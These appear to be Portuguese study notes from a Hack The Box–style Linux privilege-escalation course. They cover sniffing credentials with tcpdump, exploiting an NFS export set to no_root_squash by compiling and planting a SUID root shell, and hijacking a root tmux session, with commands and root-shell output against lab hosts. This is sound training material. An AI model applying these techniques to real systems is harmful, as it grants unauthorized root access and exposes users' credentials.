## Captura de tráfego passiva

Se `tcpdump`estiver instalado, usuários sem privilégios podem capturar tráfego de rede, incluindo, em alguns casos, credenciais passadas em texto simples.

Existem várias ferramentas, como [net-creds](https://github.com/DanMcInerney/net-creds) e [PCredz](https://github.com/lgandx/PCredz) , que podem ser usadas para examinar dados sendo passados ​​na rede. Isso pode resultar na captura de informações confidenciais, como números de cartão de crédito e strings de comunidade SNMP.

Também pode ser possível capturar hashes Net-NTLMv2, SMBv2 ou Kerberos, que podem ser submetidos a um ataque de força bruta offline para revelar a senha em texto simples. Protocolos de texto simples, como HTTP, FTP, POP, IMAP, telnet ou SMTP, podem conter credenciais que podem ser reutilizadas para escalar privilégios no host.

## Privilégios NFS fracos
O Network File System (NFS) permite que os usuários acessem arquivos ou diretórios compartilhados pela rede hospedados em sistemas Unix/Linux.

O NFS usa a porta TCP/UDP 2049. Quaisquer montagens acessíveis podem ser listadas remotamente emitindo o comando `showmount -e`, que lista a lista de exportação do servidor NFS que os clientes NFS.

```shell-session
NycolasES6@htb[/htb]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

Quando um volume NFS é criado, várias opções podem ser definidas:

| Opção            | Descrição                                                                                                                                                                                                                                                                                                             |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | Se o usuário root for usado para acessar compartilhamentos NFS, ele será alterado para o `nfsnobody`usuário, que é uma conta sem privilégios. Quaisquer arquivos criados e enviados pelo usuário root serão de propriedade do `nfsnobody`usuário, o que impede que um invasor envie binários com o bit SUID definido. |
| `no_root_squash` | Usuários remotos que se conectam ao compartilhamento como o usuário root local poderão criar arquivos no servidor NFS como o usuário root. Isso permitiria a criação de scripts/programas maliciosos com o bit SUID definido.                                                                                         |

```shell-session
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Por exemplo, podemos criar um binário SETUID que executa `/bin/sh`usando nosso usuário root local. Podemos então montar o `/tmp`diretório localmente, copiar o binário de propriedade do root para o servidor NFS e definir o bit SUID.

Primeiro, crie um binário simples, monte o diretório localmente, copie-o e defina as permissões necessárias.

```shell-session
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```shell-session
htb@NIX02:/tmp$ gcc shell.c -o shell
```

```shell-session
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

Quando retornamos para a sessão com privilégios baixos do host, podemos executar o binário e obter um shell root.

```shell-session
htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```shell-session
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

## Sequestro de sessões do Tmux
Multiplexadores de terminal como [o tmux](https://en.wikipedia.org/wiki/Tmux) podem ser usados ​​para permitir que várias sessões de terminal sejam acessadas dentro de uma única sessão de console. Quando não estiver trabalhando em uma `tmux`janela, podemos nos desconectar da sessão, ainda deixando-a ativa (ou seja, executando uma `nmap`varredura).

Por muitas razões, um usuário pode deixar um `tmux`processo em execução como um usuário privilegiado, como root configurado com permissões fracas, e pode ser sequestrado. Isso pode ser feito com os seguintes comandos para criar uma nova sessão compartilhada e modificar a propriedade.

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

Se pudermos comprometer um usuário no `dev`grupo, podemos nos conectar a esta sessão e obter acesso root.

Verifique se há algum `tmux`processo em execução.
```shell-session
tb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirme as permissões.
```shell-session
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Revise nossa associação ao grupo.
```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Por fim, conecte-se à `tmux`sessão e confirme os privilégios de root.
```shell-session
htb@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```






















































